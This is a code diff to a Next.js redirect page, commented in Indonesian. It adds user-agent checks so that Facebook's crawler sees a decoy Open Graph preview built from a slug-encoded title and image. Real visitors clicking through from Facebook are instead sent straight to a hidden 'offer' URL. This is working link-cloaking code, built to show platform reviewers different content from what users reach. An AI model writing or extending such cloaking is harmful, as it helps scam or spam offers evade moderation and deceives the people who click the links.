@@ -1,4 +1,3 @@
-// pages/data/[...slug].tsx
 import { GetServerSideProps } from "next";
 import Head from "next/head";
 import { useEffect } from "react";
@@ -9,13 +8,14 @@ interface Props {
   title: string;
 }
 
-const offerUrl = "https://example.com/offer"; // Ganti sesuai kebutuhan
+const offerUrl = "https://example.com/offer"; // Ganti dengan URL offer kamu
 
 export const getServerSideProps: GetServerSideProps = async (context) => {
   const slugParts = context.params?.slug || [];
-  const encoded = Array.isArray(slugParts) ? slugParts.join("/") : slugParts;
+  const encoded = slugParts[slugParts.length - 1]; // Ambil bagian terakhir dari [...slug]
   const fbclid = context.query.fbclid;
-  const referringURL = context.req.headers.referer || "";
+  const referer = context.req.headers.referer || "";
+  const ua = context.req.headers["user-agent"] || "";
 
   if (!encoded) return { notFound: true };
 
@@ -25,7 +25,11 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
 
     if (!redirectUrl || !imageUrl) throw new Error("Invalid data");
 
-    if (referringURL.includes("facebook.com") || fbclid) {
+    const isFacebookBot =
+      ua.includes("facebookexternalhit") || ua.includes("Facebot");
+
+    // Jika bukan bot, tapi datang dari Facebook (klik user), redirect langsung
+    if ((referer.includes("facebook.com") || fbclid) && !isFacebookBot) {
       return {
         redirect: {
           destination: offerUrl,
@@ -34,6 +38,7 @@ export const getServerSideProps: GetServerSideProps = async (context) => {
       };
     }
 
+    // Jika bot (crawler), render OG preview
     return {
       props: {
         redirectUrl,
@@ -60,10 +65,12 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
         <title>{title}</title>
         <meta name="description" content={`Read more at ${redirectUrl}`} />
         <meta property="og:title" content={title} />
+        <meta property="og:description" content="Click to read more on this page." />
         <meta property="og:url" content={redirectUrl} />
         <meta property="og:type" content="website" />
         {imageUrl && <meta property="og:image" content={imageUrl} />}
-        <link rel="icon" href="/varcel.png" />
+        <link rel="image_src" href={imageUrl} />
+        <link rel="icon" href="/varcel.png" type="image/x-icon" />
         <style>
           {`
             @keyframes spin {
@@ -73,9 +80,11 @@ export default function RedirectPage({ redirectUrl, imageUrl, title }: Props) {
           `}
         </style>
       </Head>
+
       <main style={styles.container}>
         <div style={styles.loader}></div>
         <div style={styles.loadingText}>Please wait...</div>
+        {/* Gambar tersembunyi untuk preload dan social preview */}
         {imageUrl && (
           <img
             src={imageUrl}
